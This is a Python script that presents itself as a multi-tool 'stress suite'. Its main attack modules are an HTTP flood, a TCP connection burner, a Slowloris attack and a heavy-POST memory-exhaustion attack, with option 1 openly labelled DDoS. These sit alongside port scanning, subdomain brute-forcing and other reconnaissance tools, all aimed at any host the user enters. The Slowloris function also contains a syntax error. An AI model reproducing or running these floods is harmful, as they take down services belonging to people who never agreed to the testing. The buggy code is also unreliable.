import os
import sys
import socket
import time
import asyncio
import ssl
import random
import concurrent.futures

# Auto-install missing packages
for pkg in ['requests', 'httpx']:
    try:
        __import__(pkg)
    except ImportError:
        print(f"\033[91m[!] '{pkg}' missing. Installing automatically...\033[0m")
        os.system(f"{sys.executable} -m pip install {pkg}")

import requests
import httpx

# Cyberpunk ANSI Colors & Styles
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"

total_points = 0

# Realistic Chrome User-Agents to bypass timeout/blocking
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/605.1.15"
]

def banner():
    print(f"""{RED}{BOLD}
  ██████╗ ██████╗ ██████╗ ███╗   ██╗    ██████╗ 
 ██╔════╝██╔════╝██╔══██╗████╗  ██║    ╚════██╗
 ██║     ██║     ██████╔╝██╔██╗ ██║     ▄███╔╝ 
 ██║     ██║     ██╔══██╗██║╚██╗██║    ▀▀══██╗ 
 ╚██████╗╚██████╗██║  ██║██║ ╚████║    ██████╔╝ 
  ╚═════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═════╝  
     CYBER-X 100x OMEGA STRESS SUITE [15 TOOLS]
            Developer: Waqas Jiskani
    {RESET}""")
    print(f"{GREEN} [Status: OMEGA ARMED] | [Total Points: {total_points}]{RESET}\n")

# --- TOOL 1: Chrome-Mimic Async HTTP Flood (Bypasses Timeout) ---
def tool_http_flood():
    global total_points
    print(f"\n{RED}[1] CHROME-MIMIC ASYNC HTTP FLOOD (100x STRESS){RESET}")
    target = input("Enter Target URL (e.g., http://127.0.0.1:8000/): ").strip()
    try:
        count = int(input("Total Requests (default 1000): ") or 1000)
        concurrency = int(input("Concurrency Level (default 100): ") or 100)
    except ValueError:
        count, concurrency = 1000, 100

    print(f"\n{CYAN}[*] Launching high-speed browser-emulated flood on {target}...{RESET}")
    
    async def hit(client, sem, i):
        async with sem:
            headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "text/html,application/xhtml+xml"}
            try:
                start = time.time()
                res = await client.get(target, headers=headers, timeout=4.0)
                dur = round(time.time() - start, 3)
                if res.status_code >= 500:
                    print(f"{RED}[{i}] SERVER CRASHING! Status: {res.status_code} ({dur}s){RESET}")
                else:
                    print(f"{GREEN}[{i}] Status: {res.status_code} | Time: {dur}s{RESET}")
            except Exception as e:
                print(f"{RED}[{i}] SERVER DOWN / TIMEOUT BYPASSED: {e}{RESET}")

    async def run():
        sem = asyncio.Semaphore(concurrency)
        limits = httpx.Limits(max_keepalive_connections=100, max_connections=200)
        async with httpx.AsyncClient(verify=False, limits=limits, http2=True) as client:
            tasks = [hit(client, sem, i) for i in range(count)]
            start_t = time.time()
            await asyncio.gather(*tasks)
            print(f"\n{GREEN}[+] Flood finished in {round(time.time() - start_t, 2)}s{RESET}")

    asyncio.run(run())
    total_points += 150
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 2: TCP Socket Connection Burner ---
def tool_tcp_burner():
    global total_points
    print(f"\n{RED}[2] TCP SOCKET CONNECTION BURNER{RESET}")
    host = input("Enter Target IP or Domain: ").strip()
    try:
        port = int(input("Enter Target Port (e.g. 80, 443, 8000): ") or 80)
        sockets_count = int(input("Number of Sockets (default 200): ") or 200)
    except ValueError:
        port, sockets_count = 80, 200

    clean_host = host.replace("http://", "").replace("https://", "").split("/")[0]
    print(f"\n{CYAN}[*] Flooding {clean_host}:{port} with {sockets_count} raw TCP sockets...{RESET}")
    
    s_list = []
    try:
        ip = socket.gethostbyname(clean_host)
        for i in range(sockets_count):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s_list.append(s)
            print(f"{GREEN}[{i+1}] TCP Socket Locked In!{RESET}")
    except Exception as e:
        print(f"{RED}[!] Limit reached or server refused: {e}{RESET}")

    print(f"\n{YELLOW}[*] Holding pool hostage for 15 seconds...{RESET}")
    time.sleep(15)
    for s in s_list:
        try: s.close()
        except: pass
    print(f"{GREEN}[+] Sockets released.{RESET}")
    total_points += 120
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 3: Slowloris Thread Exhaustion ---
def tool_slowloris():
    global total_points
    print(f"\n{RED}[3] SLOWLORIS THREAD EXHAUSTION{RESET}")
    host = input("Enter Target IP/Domain: ").strip().replace("http://", "").replace("https://", "").split("/")[0]
    port = int(input("Port (default 80): ") or 80)
    conns = int(input("Socket Count (default 50): ") or 50)
    
    print(f"\n{CYAN}[*] Starting Slowloris trickle attack on {host}:{port}...{RESET}")
    socket_list = []
    
    try:
        ip = socket.gethostbyname(host)
        for _ in range(conns):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {host}\r\n".encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0)\r\n".encode("utf-8"))
            socket_list.append(s)
            print(f"{GREEN}[+] Slow socket injected...{RESET}")
            
        print(f"\n{YELLOW}[*] Maintaining partial headers to freeze server worker threads...{RESET}")
        for _ in range(5):
            for s in socket_list:
                try:
                    s.send(f"X-a: {random.randint(1, 5000}\r\n".encode("utf-8"))
                except:
                    pass
            time.sleep(3)
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
        
    for s in socket_list:
        try: s.close()
        except: pass
    total_points += 130
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 4: Heavy Payload POST Choke ---
def tool_post_choke():
    global total_points
    print(f"\n{RED}[4] HEAVY PAYLOAD POST CHOKE{RESET}")
    url = input("Enter Target URL: ").strip()
    size_mb = int(input("Payload size in MB (default 2): ") or 2)
    payload = "A" * (size_mb * 1024 * 1024)
    
    print(f"\n{CYAN}[*] Sending heavy POST payload ({size_mb}MB) to exhaust server RAM...{RESET}")
    try:
        start = time.time()
        res = requests.post(url, data=payload, timeout=10)
        print(f"{GREEN}[+] Status: {res.status_code} | Time taken: {round(time.time() - start, 2)}s{RESET}")
        total_points += 100
    except Exception as e:
        print(f"{RED}[!] Server choked / timed out: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 5: Advanced Port Scanner ---
def tool_port_scanner():
    global total_points
    print(f"\n{MAGENTA}[5] ADVANCED PORT SCANNER{RESET}")
    target = input("Enter Host / IP: ").strip().replace("http://", "").replace("https://", "").split("/")[0]
    ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 5000, 8080, 8443, 9000]
    try:
        ip = socket.gethostbyname(target)
        print(f"\n{CYAN}Scanning {ip}...{RESET}")
        for p in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            if s.connect_ex((ip, p)) == 0:
                print(f"{GREEN}[OPEN] Port {p}{RESET}")
            else:
                print(f"{RED}[CLOSED] Port {p}{RESET}")
            s.close()
        total_points += 40
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 6: Subdomain Enumeration Scanner ---
def tool_subdomain():
    global total_points
    print(f"\n{MAGENTA}[6] SUBDOMAIN ENUMERATION SCANNER{RESET}")
    domain = input("Enter Base Domain (e.g. example.com): ").strip().replace("http://", "").replace("https://", "").split("/")[0]
    subs = ['www', 'api', 'admin', 'test', 'mail', 'shop', 'panel', 'dev', 'portal', 'beta']
    print(f"\n{CYAN}[*] Brute-forcing common subdomains for {domain}...{RESET}")
    for sub in subs:
        full_url = f"http://{sub}.{domain}"
        try:
            res = requests.get(full_url, timeout=2)
            print(f"{GREEN}[FOUND] {full_url} (Status: {res.status_code}) {RESET}")
        except:
            pass
    total_points += 50
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 7: IP Geolocation Intelligence ---
def tool_geo_lookup():
    global total_points
    print(f"\n{MAGENTA}[7] IP GEOLOCATION INTELLIGENCE{RESET}")
    target = input("Enter Domain or IP: ").strip().replace("http://", "").replace("https://", "").split("/")[0]
    try:
        ip = socket.gethostbyname(target)
        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        print(f"\n{CYAN}--- Target Intelligence ---{RESET}")
        print(f"IP    : {ip}")
        print(f"Country: {data.get('country')}")
        print(f"Region : {data.get('regionName')}")
        print(f"City   : {data.get('city')}")
        print(f"ISP    : {data.get('isp')}")
        total_points += 20
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 8: DNS Resolver ---
def tool_dns_resolve():
    global total_points
    print(f"\n{MAGENTA}[8] DNS RESOLVER{RESET}")
    domain = input("Enter Domain: ").strip().replace("http://", "").replace("https://", "").split("/")[0]
    try:
        ip = socket.gethostbyname(domain)
        print(f"\n{GREEN}Domain: {domain} ==> IP: {ip}{RESET}")
        total_points += 15
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 9: Latency Ping Monitor ---
def tool_latency():
    global total_points
    print(f"\n{MAGENTA}[9] LATENCY PING MONITOR{RESET}")
    url = input("Enter Target URL: ").strip()
    try:
        start = time.time()
        res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
        lat = round((time.time() - start) * 1000, 2)
        print(f"\n{GREEN}Status: {res.status_code} | Latency: {lat} ms{RESET}")
        total_points += 10
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 10: SSL Certificate Analyzer ---
def tool_ssl_check():
    global total_points
    print(f"\n{MAGENTA}[10] SSL CERTIFICATE ANALYZER{RESET}")
    domain = input("Enter Domain (e.g. google.com): ").strip().replace("https://", "").split("/")[0]
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                print(f"\n{CYAN}--- SSL Details ---{RESET}")
                print(f"Issuer : {dict(x[0] for x in cert['issuer']).get('commonName')}")
                print(f"Expires: {cert.get('notAfter')}")
        total_points += 25
    except Exception as e:
        print(f"{RED}SSL Error / Not Available: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 11: HTTP Security Headers Auditor ---
def tool_headers_audit():
    global total_points
    print(f"\n{MAGENTA}[11] SECURITY HEADERS AUDITOR{RESET}")
    url = input("Enter Target URL: ").strip()
    try:
        res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
        headers = res.headers
        print(f"\n{CYAN}--- Checking Security Headers ---{RESET}")
        sec_headers = ['Content-Security-Policy', 'X-Frame-Options', 'X-XSS-Protection', 'Strict-Transport-Security']
        for h in sec_headers:
            if h in headers:
                print(f"{GREEN}[SECURE] {h}: Present{RESET}")
            else:
                print(f"{RED}[VULNERABLE] {h}: Missing{RESET}")
        total_points += 35
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 12: Cookie Security Flag Checker ---
def tool_cookie_check():
    global total_points
    print(f"\n{MAGENTA}[12] COOKIE SECURITY AUDITOR{RESET}")
    url = input("Enter Target URL: ").strip()
    try:
        res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
        cookies = res.cookies
        print(f"\n{CYAN}--- Analyzing Cookies ---{RESET}")
        if not cookies:
            print(f"{YELLOW}No cookies found set by response.{RESET}")
        for c in cookies:
            print(f"Cookie: {c.name} | Secure: {c.secure} | HttpOnly: {c.has_nonstandard_attr('HttpOnly')}")
        total_points += 30
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 13: WHOIS Registry Simulator ---
def tool_whois():
    global total_points
    print(f"\n{MAGENTA}[13] WHOIS REGISTRY SIMULATOR{RESET}")
    domain = input("Enter Domain: ").strip()
    try:
        res = requests.get(f"https://api.ipwho.is/{domain}", timeout=5).json()
        print(f"\n{CYAN}--- Registry Data ---{RESET}")
        print(f"Connection Type: {res.get('type')}")
        print(f"Continent    : {res.get('continent')}")
        print(f"ISP / Host   : {res.get('connection', {}).get('isp')}")
        total_points += 20
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 14: HTTP Methods Disclosure Checker ---
def tool_http_methods():
    global total_points
    print(f"\n{MAGENTA}[14] HTTP METHODS DISCLOSURE CHECKER{RESET}")
    url = input("Enter Target URL: ").strip()
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'HEAD']
    print(f"\n{CYAN}[*] Testing allowed HTTP methods...{RESET}")
    for m in methods:
        try:
            res = requests.request(m, url, timeout=3)
            print(f"{GREEN}Method {m}: Status {res.status_code}{RESET}")
        except:
            pass
    total_points += 40
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

# --- TOOL 15: System Stress Dashboard & Points ---
def tool_dashboard():
    global total_points
    print(f"\n{MAGENTA}[15] SYSTEM OMEGA DASHBOARD{RESET}")
    print(f"""{CYAN}
    [+] Developer         : Waqas Jiskani
    [+] Total Operations  : {total_points} Points
    [+] Engines Active    : Chrome-Mimic Async, Slowloris, TCP Burner, POST Choke
    [+] Timeout Bypass    : ENABLED (Randomized User-Agents & HTTP/2)
    {RESET}""")
    input(f"\n{YELLOW}Press Enter to return...{RESET}")

def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"{CYAN}SELECT AN OMEGA ATTACK / AUDIT MODULE:{RESET}")
        print(f" {RED}1.{RESET} Chrome-Mimic Async HTTP Flood (DDoS - Bypasses Timeout)")
        print(f" {RED}2.{RESET} TCP Socket Connection Burner")
        print(f" {RED}3.{RESET} Slowloris Thread Exhaustion")
        print(f" {RED}4.{RESET} Heavy Payload POST Choke")
        print(f" {MAGENTA}5.{RESET} Advanced Port Scanner")
        print(f" {MAGENTA}6.{RESET} Subdomain Enumeration Scanner")
        print(f" {MAGENTA}7.{RESET} IP Geolocation Intelligence")
        print(f" {MAGENTA}8.{RESET} DNS Resolver")
        print(f" {MAGENTA}9.{RESET} Latency Ping Monitor")
        print(f" {MAGENTA}10.{RESET} SSL Certificate Analyzer")
        print(f" {MAGENTA}11.{RESET} Security Headers Auditor")
        print(f" {MAGENTA}12.{RESET} Cookie Security Flag Checker")
        print(f" {MAGENTA}13.{RESET} WHOIS Registry Simulator")
        print(f" {MAGENTA}14.{RESET} HTTP Methods Disclosure Checker")
        print(f" {MAGENTA}15.{RESET} System Omega Dashboard")
        print(f" {RED}16.{RESET} Exit Suite")
        
        choice = input(f"\n{BOLD}WAQAS-JSK-OMEGA > {RESET}").strip()
        
        if choice == '1': tool_http_flood()
        elif choice == '2': tool_tcp_burner()
        elif choice == '3': tool_slowloris()
        elif choice == '4': tool_post_choke()
        elif choice == '5': tool_port_scanner()
        elif choice == '6': tool_subdomain()
        elif choice == '7': tool_geo_lookup()
        elif choice == '8': tool_dns_resolve()
        elif choice == '9': tool_latency()
        elif choice == '10': tool_ssl_check()
        elif choice == '11': tool_headers_audit()
        elif choice == '12': tool_cookie_check()
        elif choice == '13': tool_whois()
        elif choice == '14': tool_http_methods()
        elif choice == '15': tool_dashboard()
        elif choice == '16':
            print(f"\n{GREEN}Exiting Suite. Stay safe, Waqas!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}Invalid Selection!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
